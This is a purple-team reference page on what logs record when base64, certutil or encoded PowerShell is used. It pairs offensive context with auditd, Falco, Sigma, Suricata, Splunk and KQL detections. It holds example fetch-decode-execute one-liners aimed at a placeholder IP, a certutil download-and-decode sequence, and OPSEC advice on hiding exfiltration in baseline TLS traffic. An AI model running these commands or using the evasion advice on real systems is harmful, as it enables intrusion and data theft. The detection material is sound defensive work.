---
title: "base64 & Encoding Telemetry"
parent: "5. Detection Mapping"
nav_order: 2
---

# Base64 & Encoding Telemetry: What Defenders Log When You Encode Data

_Base64 is encoding, not encryption. It does not hide data from a defender - it adds recognizable signal. This page traces exactly what host, network, and analytics telemetry records when an operator encodes data, and gives copy-pasteable detections for each layer._

## What & why

The goal is to understand the full detection surface created when an authorized operator uses base64, base32, hex, or similar transforms to stage, transport, or execute data on or off a machine. Operators reach for base64 because it makes arbitrary bytes survive text-only channels (shells, HTTP forms, DNS labels, JSON, environment variables) and because it sidesteps naive byte-level signatures. The OPSEC rationale is the inverse of the popular belief: base64 does not reduce signal, it increases it. The output uses a fixed 64-character alphabet that any regex matches in milliseconds, it inflates payload size by roughly 33 percent (4 output bytes per 3 input bytes), it is trivially reversed by any analyst, and the canonical "fetch, decode, execute" pipelines (`curl ... | base64 -d | sh`) are among the most heavily signatured behaviors in every modern detection stack. Encoding belongs in your model as a telemetry generator, not a concealment control. This page maps each encoding action to the precise log source, event ID, and field that records it, so a purple team can validate both the offensive tradecraft and the detections that should fire. For where this sits in a transfer workflow, see [data-transfer/02](../data-transfer/02-staging-and-compression.md) (staging and compression) and [data-transfer/03](../data-transfer/03-exfil-channels.md) (exfil channels).

## Technique

### Linux: where the encode invocation is captured

On Linux the authoritative host record is the kernel audit subsystem. When you run `base64`, `certutil`-equivalent tooling, `xxd`, `openssl base64`, or `python3 -c 'import base64'`, the `execve(2)` syscall is logged by auditd if a watch rule is present. The crucial detail: auditd records the full argument vector, not just `comm`. Each argument is a separate `a0`, `a1`, ... field, and the reconstructed command line appears in the `proctitle` record (hex-encoded when it contains spaces or non-printables).

```bash
# Lab: minimal auditd rule that flags execution of base64-family binaries
# /etc/audit/rules.d/encode.rules then: augenrules --load
-w /usr/bin/base64 -p x -k encode_exec
-w /usr/bin/base32 -p x -k encode_exec
-w /usr/bin/xxd    -p x -k encode_exec
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/openssl -k encode_exec
```

A single `echo SGVsbG8= | base64 -d` produces a chain of audit events. The pipeline is two processes (`bash` forks `base64`), so you see an `execve` for `/usr/bin/base64` with `a0="base64"` and `a1="-d"`, a `proctitle` record holding the decoded title, a `CWD` record, and `PATH` records for the binary and its libraries. Reconstruct events with `ausearch -k encode_exec -i`. The pipeline relationship - which parent spawned the decoder - is recoverable from the `ppid` field that links the `base64` process back to its `bash` parent.

```bash
# Lab: pull and decode the full command line + parentage for encode events
ausearch -k encode_exec -i | grep -E 'proctitle|exe=|ppid='
```

Note the pipe itself is not a syscall auditd flags - `|` is a shell construct that wires `stdout` to `stdin` via `dup2(2)`. What auditd captures is each `execve` in the pipeline as a sibling process under the same shell `pid`. The decode-and-execute tell is therefore a process-tree pattern, not a single event: `bash` -> `curl`, `bash` -> `base64`, `bash` -> `sh`, all sharing a parent, in rapid succession.

### Linux: shell history and PROMPT_COMMAND

Independent of auditd, the operator's own shell writes history. `bash` appends to `$HISTFILE` (default `~/.bash_history`) on exit or per-command if `PROMPT_COMMAND='history -a'` is set; `zsh` writes `~/.zsh_history` with extended timestamps when `EXTENDED_HISTORY` is on. Defenders and DFIR collect these directly. A literal `echo <b64> | base64 -d | bash` sits in plaintext in the history file. `HISTCONTROL=ignorespace` and `unset HISTFILE` are themselves suspicious anti-forensic tells (see [data-transfer/03](../data-transfer/03-exfil-channels.md) for how history tampering is itself logged via auditd `-w ~/.bash_history -p wa`).

### Linux: eBPF and EDR sensors

Runtime sensors observe the same `execve` at the kernel boundary but with richer context. Falco ships a default rule set that hooks `execve`/`execveat` via eBPF or its kernel module and evaluates process lineage. Tetragon (Cilium) traces `sys_execve` and emits `process_exec` events with full `arguments` and the parent chain. These do not rely on a file watch - they see every exec, so the `base64 -d` invocation and its `sh` sibling are captured even without a tuned auditd rule.

```yaml
# Lab: Falco rule sketch - decode piped into a shell interpreter
- rule: Base64 Decode Piped To Shell
  desc: base64 -d output consumed by an interpreter in the same shell session
  condition: >
    spawned_process and proc.name in (sh, bash, dash, zsh) and
    proc.pname in (base64, base32) and
    proc.cmdline contains "-d"
  output: >
    Decode-to-shell (parent=%proc.pname child=%proc.name
    cmdline=%proc.cmdline user=%user.name)
  priority: WARNING
  tags: [execution, T1140, T1059]
```

### Windows: process creation and script-block logging

On Windows the equivalent host records come from three sources that overlap:

- Security log Event ID 4688 (process creation) records the new process and, when "Include command line in process creation events" is enabled via the `ProcessCreationIncludeCmdLine_Enabled` policy, the full `CommandLine` field. This captures `certutil -encode`, `certutil -decode`, `certutil -urlcache -split -f http://... payload`, and `powershell -EncodedCommand <b64>`.
- Sysmon Event ID 1 (process creation) records `CommandLine`, `ParentImage`, `ParentCommandLine`, `Hashes`, and `OriginalFileName`. `OriginalFileName` defeats simple binary renaming because it reads the PE version resource, so a renamed `certutil.exe` still reports `CertUtil.exe`.
- PowerShell Event ID 4104 (script-block logging) records the DECODED script body. This is the single most important Windows artifact for encoded PowerShell: `powershell -EncodedCommand` takes a base64-encoded UTF-16LE blob on the command line, but 4104 logs the deobfuscated script text after decoding, so the defender reads your actual commands regardless of the `-enc` wrapper. PowerShell Event ID 4103 (module/pipeline logging) adds invocation context.

```powershell
# Lab: -EncodedCommand takes base64 of UTF-16LE. 4104 logs the DECODED body.
$cmd = 'Write-Output "lab"'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -NoProfile -EncodedCommand $enc
# Defender sees the plaintext 'Write-Output "lab"' in EID 4104, not just the blob.
```

`certutil` is a living-off-the-land binary precisely because it both downloads and decodes. The pattern `certutil -urlcache -split -f http://198.51.100.10/p.txt p.txt` followed by `certutil -decode p.txt p.exe` is captured across 4688, Sysmon EID 1 (two events, parent-linked), and Sysmon EID 3 (network connection) plus EID 11 (file create for the cached download and the decoded output).

## OPSEC notes

The loud version is the textbook one-liner: `curl http://198.51.100.10/s | base64 -d | bash`. It is loud for several independent reasons that each light up a different sensor:

- The process tree `bash -> curl` and `bash -> base64 -> sh` in sub-second succession is a named behavior in Falco, Tetragon, and every EDR. The "pipe to interpreter" shape is the signature, not the bytes.
- The full command line, including the literal strings `base64`, `-d`, and `| bash`, is captured verbatim by auditd `proctitle` and Windows 4688/Sysmon 1 `CommandLine`.
- The base64 charset is regex-trivial. A long run of `[A-Za-z0-9+/]` ending in `=` padding is matched everywhere.
- Size inflation: a 1 MB blob becomes ~1.33 MB on the wire. Combined with the recognizable charset, an inline base64 body in an HTTP POST is conspicuous to a proxy.

The quieter variant accepts that you cannot un-ring the encoding bell and instead avoids encoding-as-disguise entirely. Real concealment is encryption to opaque high-entropy bytes carried inside an already-encrypted, expected channel - TLS to an endpoint the host already talks to, with payload sizes and timing shaped to the baseline. But be honest about the residual tells that survive even strong crypto:

- Entropy itself is a signal. Ciphertext is near-maximal Shannon entropy (~8 bits/byte); so is a compressed archive. A channel that normally carries low-entropy text suddenly carrying high-entropy blobs is anomalous regardless of the algorithm.
- Volume and timing. Crypto does not hide that 200 MB left the host at 03:00 to a destination it never contacts at that hour.
- Metadata. Over TLS the SNI, certificate, destination IP/ASN, JA3/JA3S client and server fingerprints, and byte-count/packet-count remain visible to a passive sensor.

Failure modes and tells unique to encoding: base64 without padding stripping leaves the `=`/`==` terminator that regexes anchor on; URL-safe base64 (`-_` instead of `+/`) is itself a discriminator that flags "someone is moving binary through a URL"; chunking a blob to evade length thresholds creates many similar requests, which is its own beacon pattern.

## Detection & telemetry

This is the section that matters. The table maps each encoding action to its log source and a concrete detection.

| Encoding action | Where it shows up | Example detection |
| --- | --- | --- |
| `base64`/`base32`/`xxd` exec | auditd `execve`, `proctitle`; Falco/Tetragon `process_exec` | auditd watch `-w /usr/bin/base64 -p x -k encode_exec` |
| `\| base64 -d \| sh` pipeline | auditd sibling execs under one shell `pid`; EDR process tree | Falco/Sigma decode-to-interpreter rule (below) |
| `certutil -encode/-decode` | Security 4688 `CommandLine`; Sysmon EID 1, EID 11 | Sigma proc-creation rule matching `certutil` + `-decode`/`-urlcache` |
| `powershell -EncodedCommand` | Sysmon EID 1; PowerShell EID 4104 (decoded body), 4103 | 4104 hunt for decoded keywords; 4688 for `-enc`/`-e` flag |
| Shell history entry | `~/.bash_history`, `~/.zsh_history`; auditd `-w` on the file | DFIR collection; auditd write-watch on history files |
| base64 in HTTP body/URL/header | Proxy/web logs, Suricata/Zeek `http.log` | Suricata `pcre` content rule (below); proxy DLP regex |
| base64/base32 in DNS labels | DNS resolver logs, Zeek `dns.log` | label-length + entropy threshold on QNAME |
| Encoded PEM/ZIP/PDF in transit | TLS-intercepting DLP/CASB | regex for known base64 magic prefixes (below) |

### auditd: detect execution of encoder binaries

```bash
# /etc/audit/rules.d/encode.rules
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/base64 -k encode_exec
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/base32 -k encode_exec
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/openssl -k encode_exec
-w /root/.bash_history -p wa -k history_tamper
-w /home -p wa -k history_tamper
# Load: augenrules --load ; verify: auditctl -l ; read: ausearch -k encode_exec -i
```

### Sigma-style: base64 decode piped to a shell interpreter (Linux)

```yaml
title: Base64 Decode Piped To Shell Interpreter
id: 7c2c2f1e-lab0-0000-0000-decodepipe01
logsource:
  product: linux
  category: process_creation
detection:
  decoder:
    ParentImage|endswith:
      - '/base64'
      - '/base32'
  interpreter:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/zsh'
  cmdline_flag:
    CommandLine|contains: ' -d'
  condition: decoder and interpreter
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
level: high
tags:
  - attack.execution
  - attack.t1059.004
  - attack.t1140
```

### Sigma-style: certutil decode / download (Windows)

```yaml
title: Certutil Encode-Decode Or URL Cache Abuse
id: 9a1b3d2c-lab0-0000-0000-certutil0001
logsource:
  product: windows
  category: process_creation
detection:
  image:
    OriginalFileName: 'CertUtil.exe'   # survives binary rename
  flags:
    CommandLine|contains:
      - '-decode'
      - '-encode'
      - '-urlcache'
      - '-verifyctl'
  condition: image and flags
fields:
  - CommandLine
  - ParentImage
  - User
level: high
tags:
  - attack.defense_evasion
  - attack.t1140
  - attack.t1105
  - attack.s0160   # certutil
```

### Suricata: long base64 string in an HTTP request body

```
alert http any any -> any any (msg:"LAB Long Base64 In HTTP Client Body"; \
  flow:established,to_server; http.request_body; \
  pcre:"/[A-Za-z0-9+\/]{120,}={0,2}/"; \
  classtype:policy-violation; sid:9000001; rev:1;)

alert http any any -> any any (msg:"LAB Base64 In URI Query"; \
  flow:established,to_server; http.uri; \
  pcre:"/[?&][A-Za-z0-9_]+=[A-Za-z0-9+\/]{80,}={0,2}/"; \
  classtype:policy-violation; sid:9000002; rev:1;)
```

The `{120,}` and `{80,}` length floors are the practical knob: legitimate tokens (JWTs, CSRF nonces, session cookies) are also base64-ish, so tune the threshold to your baseline and combine with destination reputation. Encrypted payloads that are then base64-wrapped still match these rules - the wrapper is the giveaway, not the plaintext.

### DLP/CASB: base64 magic prefixes for common file formats

When a file is base64-encoded, its leading magic bytes encode to a stable, recognizable prefix. Match these in TLS-intercepted bodies, proxy logs, or at-rest scans:

```
# Plaintext header        -> base64 prefix to hunt for
-----BEGIN ... PRIVATE     -> LS0tLS1CRUdJTi...   (PEM key blocks)
PK\x03\x04 (ZIP/Office)    -> UEsDB              (zip, docx, xlsx, jar)
%PDF                        -> JVBER              (PDF)
\x7fELF (Linux binary)     -> f0VMR              (ELF)
MZ (Windows PE)            -> TVqQ / TVo         (PE/EXE)
```

```
# Suricata content rule for a base64-wrapped PEM private key leaving the network
alert http any any -> any any (msg:"LAB Base64 PEM Private Key Egress"; \
  flow:established,to_server; http.request_body; \
  content:"LS0tLS1CRUdJTi"; nocase; \
  classtype:policy-violation; sid:9000003; rev:1;)
```

### osquery: process events containing encoder invocations

Requires `process_events` (audit-backed evented table) enabled in the osquery config.

```sql
-- Encoder/decoder execution captured via the audit publisher
SELECT pid, parent, path, cmdline, auid, time
FROM process_events
WHERE (cmdline LIKE '%base64%' OR cmdline LIKE '%base32%'
       OR cmdline LIKE '%xxd %' OR cmdline LIKE '%openssl%base64%')
  AND time > (strftime('%s','now') - 3600);

-- Decode-to-shell pipeline heuristic on the literal command string
SELECT pid, parent, path, cmdline, time
FROM process_events
WHERE cmdline LIKE '%base64 -d%'
  AND (cmdline LIKE '%| sh%' OR cmdline LIKE '%| bash%' OR cmdline LIKE '%|sh%');
```

### Splunk: long base64 in proxy logs and command lines

```spl
index=proxy sourcetype=proxy:access
| rex field=uri_query "(?<b64>[A-Za-z0-9+/]{80,}={0,2})"
| where isnotnull(b64)
| eval b64_len=len(b64)
| stats count, values(b64_len) as lengths, dc(dest) as dests by src
| where count > 5
```

```spl
index=edr (sourcetype=Sysmon EventCode=1) OR (sourcetype=linux:audit)
| search (CommandLine="*base64 -d*" OR CommandLine="* -EncodedCommand *"
          OR CommandLine="*certutil*-decode*" OR proctitle="*base64*")
| eval decode_to_shell=if(match(CommandLine,"base64 -d.*(\||;).*(sh|bash)"),1,0)
| table _time host user ParentImage Image CommandLine decode_to_shell
```

### KQL (Microsoft Defender / Sentinel): encoded execution

```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where ProcessCommandLine has_any ("base64 -d", "-EncodedCommand", "-enc ", "certutil", "FromBase64String")
| extend DecodeToShell = ProcessCommandLine matches regex @"base64\s+-d.*[\|;].*(sh|bash)"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName,
          FileName, ProcessCommandLine, DecodeToShell
```

```kql
// Decoded PowerShell body via script-block logging (the highest-signal Windows artifact)
DeviceEvents
| where ActionType == "PowerShellCommand"      // sources 4104-style script blocks
| where AdditionalFields has_any ("Invoke-Expression", "DownloadString", "FromBase64String")
| project Timestamp, DeviceName, InitiatingProcessAccountName, AdditionalFields
```

### Network analytics: entropy, length, and DNS-label heuristics

Encoding leaves statistical fingerprints a flow analyzer scores directly:

- Shannon entropy. Base64 text sits around 5.5-6.0 bits/char (a 64-symbol alphabet caps at 6.0); raw ciphertext or compressed data sits near 8.0 bits/byte. A field that is normally low-entropy English suddenly scoring high is the anomaly. Compute entropy per HTTP field, per DNS label, per cookie value.
- Length thresholds. The base64 charset regex `[A-Za-z0-9+/]{20,}={0,2}` with a tuned minimum length is the front-line content match. For URL-safe variants add `_-` to the class.
- DNS exfil. Encoding data into subdomain labels produces long, high-entropy QNAMEs. Hunt on label length (>30 chars), total QNAME length approaching the 253-byte limit, query rate to one parent domain, and `TXT`/`NULL` record types. Zeek `dns.log` plus an entropy UDF surfaces this; the ~33 percent base64 inflation makes the labels longer than any legitimate hostname.

```spl
index=dns sourcetype=zeek:dns
| eval qlen=len(query)
| rex field=query "^(?<label>[^.]+)\."
| eval label_len=len(label)
| where label_len > 30 OR qlen > 100
| stats count, avg(label_len) as avg_label by query_parent, src
| where count > 20
```

EDR command-line ML models complement all of this: vendors train classifiers on `CommandLine`/`proctitle` token distributions, so a string mixing `base64`, `-d`, a URL, and a shell name scores high even if no single rule matches. This is why "obfuscate the one-liner" rarely helps - the feature vector is the behavior, not the exact substring.

## MITRE ATT&CK

- T1132 - Data Encoding (and T1132.001 Standard Encoding, T1132.002 Non-Standard Encoding)
- T1140 - Deobfuscate/Decode Files or Information
- T1027 - Obfuscated Files or Information
- T1059.001 - Command and Scripting Interpreter: PowerShell
- T1059.004 - Command and Scripting Interpreter: Unix Shell
- T1105 - Ingress Tool Transfer
- T1071.001 - Application Layer Protocol: Web Protocols
- T1071.004 - Application Layer Protocol: DNS
- T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
- T1041 - Exfiltration Over C2 Channel
- S0160 - certutil (associated tool)

## References

- MITRE ATT&CK, T1132 Data Encoding. https://attack.mitre.org/techniques/T1132/
- MITRE ATT&CK, T1140 Deobfuscate/Decode Files or Information. https://attack.mitre.org/techniques/T1140/
- Linux Audit, auditctl and audit.rules man pages. https://man7.org/linux/man-pages/man8/auditctl.8.html
- GNU Coreutils, base64 invocation. https://www.gnu.org/software/coreutils/manual/html_node/base64-invocation.html
- Microsoft, About Logging Windows (PowerShell script-block and module logging, EID 4103/4104). https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_logging_windows
- Microsoft, Sysmon (Sysinternals) event reference. https://learn.microsoft.com/sysinternals/downloads/sysmon
- Falco default rules and supported fields. https://falco.org/docs/rules/
- Cilium Tetragon process execution events. https://tetragon.io/docs/concepts/events/
- Suricata pcre and http keywords reference. https://docs.suricata.io/en/latest/rules/http-keywords.html
- osquery process_events table schema. https://osquery.io/schema/current/
- RFC 4648, The Base16, Base32, and Base64 Data Encodings. https://www.rfc-editor.org/rfc/rfc4648
